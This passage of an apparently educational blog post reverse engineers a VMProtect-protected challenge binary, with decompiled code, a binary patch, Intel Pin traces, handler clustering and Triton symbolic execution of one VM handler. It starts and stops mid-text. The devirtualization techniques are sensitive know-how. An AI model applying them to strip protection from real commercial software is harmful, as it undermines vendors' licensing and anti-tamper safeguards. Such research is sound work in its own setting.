symbol <code>??_7UnpackMe@@6B@</code> and automatically names the first vtable entry as <code>UnpackMe::Run</code>. Let&#x2019;s now jump into <code>UnpackMe::Run</code>, which opens the main loop.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::Run</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *<span class="hljs-keyword">this</span>, HINSTANCE hInst)</span></span><span class="hljs-function"></span>{    *((DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">1</span>) = hInst;    WNDCLASSEXW wc = {<span class="hljs-number">0</span>};    wc.cbSize       = <span class="hljs-keyword">sizeof</span>(wc);    wc.style        = <span class="hljs-number">3</span>;    wc.lpfnWndProc  = (WNDPROC)sub_40CC70;    wc.hInstance    = hInst;    wc.lpszClassName = <span class="hljs-string">L&quot;WndClass_DevirtualizeMe&quot;</span>;    RegisterClassExW(&amp;wc);    ((<span class="hljs-keyword">void</span> (__thiscall*)(<span class="hljs-keyword">void</span>*))(*(DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">8</span>))(<span class="hljs-keyword">this</span>);    <span class="hljs-keyword">while</span> ( GetMessageW(&amp;Msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) )    {        TranslateMessage(&amp;Msg);        DispatchMessageW(&amp;Msg);   <span class="hljs-comment">// &#xC5EC;&#xAE30;&#xC11C; WndProc &#xCCB4;&#xC778;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC10;</span>    }}</code></pre><p>From a devirtualization point of view, <code>Run</code> acts as a kind of gatekeeper into the VM. When the user presses the P key, the program flows through this loop and eventually reaches the VMProtect entry point.</p><p>This function registers a window class, sets <code>lpfnWndProc = sub_40CC70</code> as the global WndProc, and then repeatedly calls <code>DispatchMessageW</code> inside the message loop. All key input (including P) goes through this message loop and eventually arrives at <code>WndProc</code>, which then routes messages into <code>UnpackMe</code>&#x2019;s member functions.</p><pre><code class="hljs c"><span class="hljs-function">LRESULT __stdcall <span class="hljs-title">WndProc</span><span class="hljs-params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( dword_415F08 )        <span class="hljs-comment">// vtable[1] = UnpackMe::WndProc(sub_40CB60)</span>        <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__thiscall*)(<span class="hljs-keyword">void</span>*, HWND, UINT, WPARAM, LPARAM))                (*(DWORD*)UnpackMe* <span class="hljs-keyword">this</span> + <span class="hljs-number">4</span>))(                    dword_415F08, hWnd, Msg, wParam, lParam);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">return</span> DefWindowProcW(hWnd, Msg, wParam, lParam);}</code></pre><p>The important point here is that the OS has no idea that a C++ class named <code>UnpackMe</code> even exists, nor how many instances there are. The OS only knows that for windows of class <code>WndClass_DevirtualizeMe</code>, the WndProc is <code>sub_40CC70</code>, and that function internally forwards messages into <code>UnpackMe::WndProc</code>.</p><p>In other words, from a devirtualization perspective, all keyboard messages eventually end up in <code>UnpackMe::WndProc</code>. Therefore we only need to see how this <code>WndProc()</code> handles <code>WM_KEYDOWN</code>.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::WndProc</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                 HWND hWnd,</span></span><span class="hljs-function"><span class="hljs-params">                                 UINT Msg,</span></span><span class="hljs-function"><span class="hljs-params">                                 WPARAM wParam,</span></span><span class="hljs-function"><span class="hljs-params">                                 LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( Msg &gt; <span class="hljs-number">0x14</span> )    {        <span class="hljs-keyword">if</span> ( Msg &lt;= <span class="hljs-number">0x111</span> )        {            <span class="hljs-keyword">switch</span> ( Msg )            {            <span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:  <span class="hljs-comment">// WM_KEYDOWN</span>                <span class="hljs-comment">// vtable[6] = OnKeyDown</span>                <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__thiscall*)(<span class="hljs-keyword">void</span>*, HWND, WPARAM, LPARAM))                        (*(DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">24</span>))(                            <span class="hljs-keyword">this</span>, hWnd, wParam, lParam);            <span class="hljs-keyword">case</span> <span class="hljs-number">0x111</span>:  <span class="hljs-comment">// WM_COMMAND</span>                ...            }        }    }    ...}</code></pre><p>When <code>WM_KEYDOWN</code> arrives, this function forwards control to <code>OnKeyDown</code>, which is mapped to <code>vtable[6]</code>. Up to this point we are still just in the message routing layer, and no VMProtect virtualized code has appeared yet. But we do not have to be disappointed&#x2014;things are about to get more interesting.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::OnKeyDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                   HWND hWnd,</span></span><span class="hljs-function"><span class="hljs-params">                                   WPARAM wParam,</span></span><span class="hljs-function"><span class="hljs-params">                                   LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( wParam == <span class="hljs-string">&apos;P&apos;</span> )        proc();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>OnKeyDown</code> is where the key input is actually checked. When <code>wParam</code> equals the character <code>&apos;P&apos;</code> (0x50), it calls <code>proc()</code>. All other key presses are ignored.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image5.png" alt></p><p>If you run the program and press P, a message box appears with some address information. That entry point is effectively what we call <code>vir_Entry()</code>.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image6.png" alt></p><p>From this point onward IDA shows <code>call analysis failed</code> and cannot decompile the function. This means that inside this function, there are abnormal control flows, indirect branches, and sequences that scramble the stack/registers, making it hard to lift back to normal C code. In other words, from the perspective of building or using a devirtualizer, this <code>vir_Entry()</code> becomes our starting point.</p><p>By static analysis we traced the full path to the virtualized code as:</p><pre><code class="hljs c">WinMain &#x2192; UnpackMe::Run &#x2192; DispatchMessage &#x2192; UnpackMe::WndProc &#x2192; OnKeyDown &#x2192; proc()</code></pre><p>and we confirmed that <code>proc()</code> (and <code>vir_Entry</code> inside it) is where VMEntry and the body of the VMProtect-virtualized function live.</p><p>Now that we have the VMEntry address, let&#x2019;s attach a debugger and follow the execution. Starting at <code>0x004869BB</code>, you can see VMProtect&#x2019;s characteristic VM engine code: repeated patterns of <code>push</code>, <code>call</code>, <code>xor</code>, <code>add</code>, and so on, together with instructions like <code>mov eax, [esi]</code> / <code>add esi, 4</code> that repeatedly load from the bytecode stream. This shows clearly that VMProtect is updating virtual registers and the bytecode pointer (<code>ESI</code>) while stepping through handlers.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image7.png" alt></p><p>Trying to analyze the entire VM engine as one big CFG is practically impossible for a human. VMProtect fills the code with thousands of junk instructions and aggressive control-flow flattening, making the actual VM dispatcher and handler paths extremely tangled.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image8.png" alt></p><p>At first, I tried walking through the handlers and dispatcher in the debugger, chasing <code>jmp</code> instructions to the end in the hope that something meaningful would appear. Instead, I repeatedly landed on trivial &#x201C;trampoline&#x201D; handlers that only redirected control elsewhere without doing any semantically interesting work. This pattern repeated over and over.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image9.png" alt></p><p>I wanted to catch a <code>VMExit</code>, but no matter how long I followed the flow, it was just handler &#x2192; dispatcher &#x2192; handler &#x2192; &#x2026; like an endless staircase to heaven. From the debugger&#x2019;s point of view, it felt impossible to ever escape this loop. On top of that, the VM does not use physical registers like a normal CPU. It hides values in virtual registers such as <code>VIP</code> and <code>VSP</code> and in encrypted stack regions. Staring at <code>EAX</code> all day yields nothing meaningful.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image10.png" alt></p><p>&#x2026; At this point I felt that my lifetime was too short to finish this using only live debugging. Time to look for another approach.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><pre><code class="hljs c"><span class="hljs-number">0040</span>D153 FF10           call dword ptr [eax]<span class="hljs-number">0040</span>D155 FF35 <span class="hljs-number">085F</span>4100  push dword ptr [<span class="hljs-number">415F</span>08]<span class="hljs-number">0040</span>D15B E8 <span class="hljs-number">623F</span>FFFF    call <span class="hljs-number">4010</span>C2<span class="hljs-number">0040</span>D160 <span class="hljs-number">83</span>C4 <span class="hljs-number">04</span>        add esp, <span class="hljs-number">4</span><span class="hljs-number">0040</span>D163 <span class="hljs-number">5</span>D             pop ebp<span class="hljs-number">0040</span>D164 C2 <span class="hljs-number">1000</span>        ret <span class="hljs-number">10</span></code></pre><p><img src="/2025/12/11/banda/VMPpart2/en/image11.png" alt></p><p>To trace the program more effectively, I first applied a small patch to the original binary. For reasons I am not certain about (whether intentional or accidental), when run under Intel Pin, this challenge binary stayed in the background and did not respond to my key presses. So I modified the binary so that right after startup it immediately jumps into VM Entry, without waiting for me to press P.</p><h3 id="Collecting-Trace-with-Pin"><a href="#Collecting-Trace-with-Pin" class="headerlink" title="Collecting Trace with Pin"></a>Collecting Trace with Pin</h3><p>Intel Pin is a dynamic binary instrumentation tool that lets you inject analysis code into a running program. Regardless of what kind of obfuscation is applied, Pin can intercept and log every single instruction that actually executes. It will not miss even one instruction.</p><p>To collect traces, I first identified several key addresses through static analysis:</p><ul><li><strong>gDispEntry (<code>0x004869BB</code>):</strong> VM Entry (dispatcher entry point)</li></ul><p><img src="/2025/12/11/banda/VMPpart2/en/image12.png" alt></p><ul><li><strong>gHandler82 (<code>0x004181BB</code>):</strong> entry point of a specific handler (ID 82) found through analysis</li></ul><pre><code class="hljs c"><span class="hljs-number">24566</span> vmtrace.outi:<span class="hljs-number">0x004869bb</span>:<span class="hljs-number">5</span>:<span class="hljs-number">68</span>EACF8694r:<span class="hljs-number">0x004869c0</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff20</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x004869c0</span>:<span class="hljs-number">5</span>:E883A9FFFFr:<span class="hljs-number">0x00481348</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff1c</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00481348</span>:<span class="hljs-number">1</span>:<span class="hljs-number">51</span>r:<span class="hljs-number">0x00481349</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff18</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00481349</span>:<span class="hljs-number">5</span>:E9CA50FBFFr:<span class="hljs-number">0x00436418</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff18</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00436418</span>:<span class="hljs-number">1</span>:<span class="hljs-number">55</span></code></pre><p>I first extracted from the trace a region corresponding to one full cycle of the VMProtect VM, and that alone already produced on the order of <code>n0,000</code> lines of log. At this scale it becomes essential to split the trace at handler boundaries and automatically identify repeating patterns.</p><p>Lines starting with <code>i:</code> record the executed instructions,</p><p>and lines starting with <code>r:</code> record the register and stack state at that point.</p><p>Jonathan Salwan&#x2019;s <a href="https://github.com/JonathanSalwan/VMProtect-devirtualization">VMProtect-devirtualization</a> project was extremely helpful here.</p><p><strong>Identifying VM main loop and handler candidates with <code>uniq -c</code></strong></p><pre><code class="hljs c"><span class="hljs-number">108</span> <span class="hljs-number">0x0047f287</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ae</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ac</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ab</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8a7</span><span class="hljs-number">107</span> <span class="hljs-number">0x004181bb</span> <span class="hljs-number">64</span> <span class="hljs-number">0x00464679</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd6</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd4</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd2</span></code></pre><p>I computed the execution count per address from the trace, using a <code>uniq -c</code> style analysis to list the most frequently executed locations. Static analysis then allowed me to categorize them as follows:</p><ul><li><p>Highest frequency, 108 times: VM dispatcher</p><ul><li><p><strong>VM Dispatcher</strong></p><p>  Addresses like <code>0x0047f287</code> and <code>0x0044a8a7</code> appeared exactly 108 times each. These are pieces of dispatcher code. The dispatcher implements the CPU-like cycle in software (fetch &#x2192; decode &#x2192; dispatch &#x2192; execute). Since the dispatcher itself does not perform interesting semantics, we can skip over it for now.</p></li></ul></li><li><p>Second highest frequency, 107 times: handler ID 82</p><ul><li><p><strong>Most frequently used handler (<code>LCONST</code>)</strong></p><p>  Address <code>0x004181BB</code> is a strong candidate for a constant-load handler once we consider VMProtect&#x2019;s stack-based VM design. In a stack machine, most operations happen on the stack, so load/copy/move-style operations tend to be used heavily. Prioritizing the most frequently executed handler for analysis is usually efficient.</p></li></ul></li></ul><h3 id="Running-the-Pin-Trace-Again"><a href="#Running-the-Pin-Trace-Again" class="headerlink" title="Running the Pin Trace Again"></a>Running the Pin Trace Again</h3><p>I then extended the original Pin tool (based on the template provided with Intel Pin) into a specialized Pintool that captures only the ID 82 handler. The goal is to reverse engineer what the VMProtect VM actually does for this single opcode.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image13.png" alt></p><p>To capture the behavior of a single VM instruction dynamically, I built Pin support to:</p><ul><li>Anchor each VM instruction using two fixed IP locations</li><li>Capture the 4 bytes pointed to by <code>ESI</code> at the moment the bytecode is loaded</li><li>Record <code>EAX</code>/<code>EDI</code> at the point where the handler finishes its computation and pushes the result onto the stack (using Pin&#x2019;s CONTEXT)</li></ul><p><img src="/2025/12/11/banda/VMPpart2/en/image14.png" alt></p><p>Using the built <code>MyPinTool</code>, I collected three types of information:</p><p><strong>1. <code>vmtrace.out</code>: the complete x86 instruction trace from dispatcher entry to VM exit</strong></p><pre><code class="hljs c"><span class="hljs-meta">#main exe: [0x00400000, 0x00581fff)</span><span class="hljs-number">004869b</span>b <span class="hljs-number">68</span> EA CF <span class="hljs-number">86</span> <span class="hljs-number">94</span><span class="hljs-number">004869</span>c0 E8 <span class="hljs-number">83</span> A9 FF FF<span class="hljs-number">00481348</span> <span class="hljs-number">51</span><span class="hljs-number">00481349</span> E9 CA <span class="hljs-number">50</span> FB FF<span class="hljs-number">00436418</span> <span class="hljs-number">55</span><span class="hljs-number">00436419</span> <span class="hljs-number">50</span><span class="hljs-number">0043641</span>a <span class="hljs-number">66</span> F7 D5<span class="hljs-number">0043641</span>d E9 <span class="hljs-number">15</span> <span class="hljs-number">92</span> FE FF<span class="hljs-number">0041f</span>637 <span class="hljs-number">57</span><span class="hljs-number">0041f</span>638 <span class="hljs-number">0F</span> BF FF...</code></pre><p>This file contains every x86 instruction executed from <code>0x004869BB</code> (VM dispatcher entry) until the VM finishes. Each line records the instruction address and machine bytes. The script that walks the trace also dumps a plain text file side by side.</p><p><strong>2. <code>bytecode_values.txt</code>: the <code>[ESI]</code> value when entering handler ID 82 (i.e., the VM instruction operand)</strong></p><pre><code class="hljs c"><span class="hljs-number">1</span>,<span class="hljs-number">0x0047fa5f</span>,<span class="hljs-number">0x1ecbf564</span>,<span class="hljs-number">0x000271c9</span>,<span class="hljs-number">0x004892af</span><span class="hljs-number">2</span>,<span class="hljs-number">0x0045cb33</span>,<span class="hljs-number">0x1ec6b25f</span>,<span class="hljs-number">0xfffcff9f</span>,<span class="hljs-number">0x00432085</span><span class="hljs-number">3</span>,<span class="hljs-number">0x0046ef95</span>,<span class="hljs-number">0x1ec5393d</span>,<span class="hljs-number">0xfffdab5b</span>,<span class="hljs-number">0x0043cc41</span># Total ID82 calls: <span class="hljs-number">3</span></code></pre><p>If we open the extracted <code>bytecode_values.txt</code>, we can see which constants/operands were fed into handler ID 82. By comparing the operand patterns across multiple calls, we can infer whether this handler is pushing constants onto the stack, applying certain transforms to the operand, or using it as an index, and so on. Later, we will feed these concrete values into Triton when performing symbolic execution.</p><p><strong>3. <code>id82_registers.txt</code>: register snapshots at handler entry</strong></p><pre><code class="hljs c">=== VM Entry (<span class="hljs-number">0x004869bb</span>) ===INIT_ESI=<span class="hljs-number">0x0000000a</span>INIT_EBP=<span class="hljs-number">0x0019ff74</span>INIT_ESP=<span class="hljs-number">0x0019ff04</span>===========================ID82_001: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0x000271c9</span> EBX=<span class="hljs-number">0x00458b96</span> ECX=<span class="hljs-number">0x00000020</span> EDX=<span class="hljs-number">0x00000000</span> ESI=<span class="hljs-number">0x0047fa63</span> EDI=<span class="hljs-number">0x004892af</span> EBP=<span class="hljs-number">0x0019fed8</span> ESP=<span class="hljs-number">0x0019fe18</span> BYTECODE=<span class="hljs-number">0x1ecbf564</span>ID82_002: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0xfffcff9f</span> EBX=<span class="hljs-number">0xffb934ac</span> ECX=<span class="hljs-number">0x00000020</span> EDX=<span class="hljs-number">0x0000422a</span> ESI=<span class="hljs-number">0x0045cb37</span> EDI=<span class="hljs-number">0x00432085</span> EBP=<span class="hljs-number">0x0019fcd0</span> ESP=<span class="hljs-number">0x0019fc10</span> BYTECODE=<span class="hljs-number">0x1ec6b25f</span>ID82_003: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0xfffdab5b</span> EBX=<span class="hljs-number">0xffbb44ce</span> ECX=<span class="hljs-number">0xdcedb11a</span> EDX=<span class="hljs-number">0x00000000</span> ESI=<span class="hljs-number">0x0046ef99</span> EDI=<span class="hljs-number">0x0043cc41</span> EBP=<span class="hljs-number">0x0019fcc0</span> ESP=<span class="hljs-number">0x0019fc00</span> BYTECODE=<span class="hljs-number">0x1ec5393d</span># Total ID82 calls: <span class="hljs-number">3</span></code></pre><p>This file logs the VM entry state and, for each ID 82 call, the exact register values right before executing the handler, along with the bytecode operand (<code>BYTECODE</code>). In other words, for handler ID 82 we now have:</p><ul><li>The handler&#x2019;s code</li><li>Its input (bytecode and register state)</li><li>The initial VM state at entry</li></ul><p>This matches our goal of fully reconstructing the semantics of a single VM opcode.</p><h3 id="Splitting-the-VM-only-trace-by-ID-82-execution-segments"><a href="#Splitting-the-VM-only-trace-by-ID-82-execution-segments" class="headerlink" title="Splitting the VM-only trace by ID 82 execution segments"></a>Splitting the VM-only trace by ID 82 execution segments</h3><p>With these logs in hand, we can now start restoring the meaning of individual VM handlers.</p><pre><code class="hljs c">total ins: <span class="hljs-number">58414</span>ID82 entries: <span class="hljs-number">107</span><span class="hljs-function">ID82 <span class="hljs-title">segments</span> <span class="hljs-params">(with glue)</span>: 106</span>written id82_segments.json</code></pre><p>To do that, I wrote a script that takes <code>vmtrace.out</code>, locates each occurrence of ID 82, and slices the trace into segments corresponding to &#x201C;one execution of ID 82, including its glue code.&#x201D; Each such segment is then written into a JSON file. Earlier we counted 107 entries for ID 82; the script extracted 106 segments into the JSON.</p><pre><code class="hljs c">{  <span class="hljs-string">&quot;idx&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-string">&quot;start_ip&quot;</span>: <span class="hljs-number">4293051</span>,  <span class="hljs-string">&quot;end_ip&quot;</span>: <span class="hljs-number">4715143</span>,  <span class="hljs-string">&quot;ins&quot;</span>: [    <span class="hljs-string">&quot;004181bb FF E7&quot;</span>,    <span class="hljs-string">&quot;00468429 8B C5&quot;</span>,    <span class="hljs-string">&quot;0046842b 66 85 F2&quot;</span>,    <span class="hljs-string">&quot;0046842e 81 ED 04 00 00 00&quot;</span>,    <span class="hljs-string">&quot;00468434 66 3B FE&quot;</span>,    <span class="hljs-string">&quot;00468437 89 44 25 00&quot;</span>,    <span class="hljs-string">&quot;0046843b 9F&quot;</span>,    <span class="hljs-string">&quot;0046843c 13 C6&quot;</span>,    <span class="hljs-string">&quot;0046843e E9 C1 EC FE FF&quot;</span>,    <span class="hljs-string">&quot;00457104 8B 06&quot;</span>,    <span class="hljs-string">&quot;00457106 3B E6&quot;</span>,    <span class="hljs-string">&quot;00457108 81 C6 04 00 00 00&quot;</span>,    <span class="hljs-string">&quot;0045710e 33 C3&quot;</span>,    <span class="hljs-string">&quot;00457110 E9 BB 7D FE FF&quot;</span>,    <span class="hljs-string">&quot;0043eed0 D1 C8&quot;</span>,    <span class="hljs-string">&quot;0043eed2 35 B9 3D CB 4A&quot;</span>,    <span class="hljs-string">&quot;0043eed7 F5&quot;</span>,    <span class="hljs-string">&quot;0043eed8 F9&quot;</span>,    <span class="hljs-string">&quot;0043eed9 66 85 C4&quot;</span>,    <span class="hljs-string">&quot;0043eedc 2D 40 01 8C 45&quot;</span>,    <span class="hljs-string">&quot;0043eee1 E9 FC 23 FF FF&quot;</span>,    <span class="hljs-string">&quot;004312e2 D1 C0&quot;</span>,    <span class="hljs-string">&quot;004312e4 33 D8&quot;</span>,    <span class="hljs-string">&quot;004312e6 03 F8&quot;</span>,    <span class="hljs-string">&quot;004312e8 E9 B3 DE 02 00&quot;</span>,    <span class="hljs-string">&quot;0045f1a0 E9 02 B7 FE FF&quot;</span>,    <span class="hljs-string">&quot;0044a8a7 8D 44 24 60&quot;</span>,    <span class="hljs-string">&quot;0044a8ab F5&quot;</span>,    <span class="hljs-string">&quot;0044a8ac 3B E8&quot;</span>,    <span class="hljs-string">&quot;0044a8ae E9 D4 49 03 00&quot;</span>,    <span class="hljs-string">&quot;0047f287 0F 87 2E 8F F9 FF&quot;</span>  ]}</code></pre><p>Each segment contains the flow from entry into ID 82 &#x2192; various glue/shared code &#x2192; return to the dispatcher. However, there is still a lot of VMProtect-inserted noise mixed in, so this alone does not yet isolate the pure handler body. We need to keep going.</p><h3 id="Clustering-ID-82-patterns"><a href="#Clustering-ID-82-patterns" class="headerlink" title="Clustering ID 82 patterns"></a>Clustering ID 82 patterns</h3><pre><code class="hljs c">total segments: <span class="hljs-number">106</span>unique patterns: <span class="hljs-number">70</span>==== pattern <span class="hljs-number">1</span> size <span class="hljs-number">5</span>indices: [<span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">60</span>, <span class="hljs-number">78</span>, <span class="hljs-number">94</span>]==== pattern <span class="hljs-number">2</span> size <span class="hljs-number">5</span>indices: [<span class="hljs-number">21</span>, <span class="hljs-number">43</span>, <span class="hljs-number">62</span>, <span class="hljs-number">82</span>, <span class="hljs-number">99</span>]==== pattern <span class="hljs-number">3</span> size <span class="hljs-number">4</span>indices: [<span class="hljs-number">19</span>, <span class="hljs-number">39</span>, <span class="hljs-number">59</span>, <span class="hljs-number">93</span>]==== pattern <span class="hljs-number">4</span> size <span class="hljs-number">4</span>indices: [<span class="hljs-number">22</span>, <span class="hljs-number">65</span>, <span class="hljs-number">84</span>, <span class="hljs-number">103</span>]...</code></pre><p>Next, I loaded the JSON, compared each segment&#x2019;s byte sequence, and grouped those with identical sequences into clusters. When we do this per handler, segments with exactly the same instruction pattern end up in the same cluster. For example, in pattern 1, segments 20, 40, 60, 78, and 94 all share the same sequence of bytes and thus form one cluster.</p><p>The purpose of this clustering is to pick one representative pattern per handler. For ID 82, we can choose, say, index 20 from pattern 1 as the canonical example and use it as a reference to understand the handler&#x2019;s semantics.</p><h3 id="Simulating-Handler-ID-82-with-Triton"><a href="#Simulating-Handler-ID-82-with-Triton" class="headerlink" title="Simulating Handler ID 82 with Triton"></a>Simulating Handler ID 82 with Triton</h3><p>Using the clustering result, I dumped the bytes for the segment at index 20 (pattern 1) as a contiguous block of x86 code:</p><pre><code class="hljs c">written id82_handler.<span class="hljs-keyword">asm</span> from idx <span class="hljs-number">20</span><span class="hljs-number">004181b</span>b FF E7<span class="hljs-number">0044f</span>a7a <span class="hljs-number">0F</span> B6 <span class="hljs-number">06</span><span class="hljs-number">0044f</span>a7d <span class="hljs-number">81</span> C6 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-number">0044f</span>a83 <span class="hljs-number">32</span> C3<span class="hljs-number">0044f</span>a85 <span class="hljs-number">66</span> F7 C2 DE <span class="hljs-number">7B</span><span class="hljs-number">0044f</span>a8a F9<span class="hljs-number">0044f</span>a8b <span class="hljs-number">2</span>C <span class="hljs-number">3</span>A<span class="hljs-number">0044f</span>a8d D0 C8<span class="hljs-number">0044f</span>a8f F6 D8<span class="hljs-number">0044f</span>a91 E9 <span class="hljs-number">48</span> <span class="hljs-number">9B</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span></code></pre><p>Comparing this with the corresponding IDA disassembly, we can see the structure more clearly:</p><p><img src="/2025/12/11/banda/VMPpart2/en/image15.png" alt></p><p><code>0x004181BB: FF E7 &#x2192; 0x004181BB jmp edi</code> is the &#x201C;glue&#x201D; entry point where the dispatcher has already loaded the handler&#x2019;s address into <code>EDI</code> and now jumps there.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image16.png" alt></p><p>From <code>0x0044FA7A</code> onward is the essential body of ID 82&#x2019;s front half.</p><p>This code performs <code>movzx eax, byte ptr [esi]</code> / <code>add esi, 1</code> to consume the first byte of bytecode (the opcode), then scrambles <code>AL</code> using <code>XOR</code>, <code>SUB</code>, <code>ROR</code>, <code>NEG</code>, etc., and finally jumps onward. Later, it executes <code>mov eax, [esi]</code> / <code>lea esi, [esi+4]</code> to read 4 bytes, presumably the operand. That 4-byte value is decrypted via a series of operations and used to update <code>EBX</code>. Control then returns to the dispatcher loop at <code>0x4323ff</code>.</p><p>So, by combining Pin&#x2019;s trace with IDA disassembly, we have reconstructed the complete native code for handler ID 82 as seen in <code>vmtrace.out</code>. We are almost there.</p><p>But this is still not yet the end. To fully understand the mathematical transformation encoded by this handler, we need to load this code into Triton, feed it the initial register state and bytecode values we collected earlier, and perform symbolic execution.</p><h3 id="Tracking-state-changes"><a href="#Tracking-state-changes" class="headerlink" title="Tracking state changes"></a>Tracking state changes</h3><p>Using Triton to execute the ID 82 path and compare the registers before and after, we obtain a trace like the following:</p><pre><code class="hljs c"><span class="hljs-number">0x4442f2</span>: shr dh, cl<span class="hljs-number">0x43641a</span>: <span class="hljs-keyword">not</span> bp--- [ Logic Start (0x41F637) ] ---<span class="hljs-number">0x41f638</span>: movsx edi, di<span class="hljs-number">0x41f63c</span>: lahf<span class="hljs-number">0x41f63d</span>: bts ebp, esi<span class="hljs-number">0x41f641</span>: cmp bh, <span class="hljs-number">0xb4</span><span class="hljs-number">0x41f645</span>: shr bp, <span class="hljs-number">0xa6</span><span class="hljs-number">0x41f649</span>: sub ebx, edx<span class="hljs-number">0x41f64b</span>: test esi, ebp<span class="hljs-number">0x41f64e</span>: xchg ah, bh<span class="hljs-number">0x41f650</span>: sub ax, bx<span class="hljs-number">0x41f653</span>: movsx ebx, bp<span class="hljs-number">0x41f656</span>: mov eax, <span class="hljs-number">0</span><span class="hljs-number">0x41f65b</span>: <span class="hljs-keyword">not</span> si<span class="hljs-number">0x41f65e</span>: xadd ebp, esi<span class="hljs-number">0x41f662</span>: mov esi, dword ptr [esp + <span class="hljs-number">0x28</span>]<span class="hljs-number">0x41f666</span>: add esi, <span class="hljs-number">0x55106798</span><span class="hljs-number">0x41f66c</span>: neg esi<span class="hljs-number">0x41f66e</span>: rol edi, <span class="hljs-number">0x70</span><span class="hljs-number">0x41f671</span>: add esi, <span class="hljs-number">0x69733a52</span><span class="hljs-number">0x41f677</span>: btr ebp, <span class="hljs-number">0xc0</span><span class="hljs-number">0x41f67b</span>: rol esi, <span class="hljs-number">1</span><span class="hljs-number">0x41f67d</span>: sbb ebx, <span class="hljs-number">0x37516d2d</span><span class="hljs-number">0x41f683</span>: <span class="hljs-keyword">not</span> esi<span class="hljs-number">0x41f685</span>: clc<span class="hljs-number">0x41f686</span>: cmp eax, esp<span class="hljs-number">0x41f688</span>: <span class="hljs-keyword">xor</span> ebp, esp<span class="hljs-number">0x41f68a</span>: add esi, eax<span class="hljs-number">0x41f68c</span>: setns al<span class="hljs-number">0x41f68f</span>: mov ebp, esp<span class="hljs-number">0x41f691</span>: sub bx, sp<span class="hljs-number">0x41f694</span>: rol ax, cl<span class="hljs-number">0x41f697</span>: dec di<span class="hljs-number">0x41f69a</span>: sub esp, <span class="hljs-number">0xc0</span><span class="hljs-number">0x41f6a0</span>: jmp <span class="hljs-number">0x453e79</span><span class="hljs-number">0x453e79</span>: mov ebx, esi<span class="hljs-number">0x453e7b</span>: bt eax, esp<span 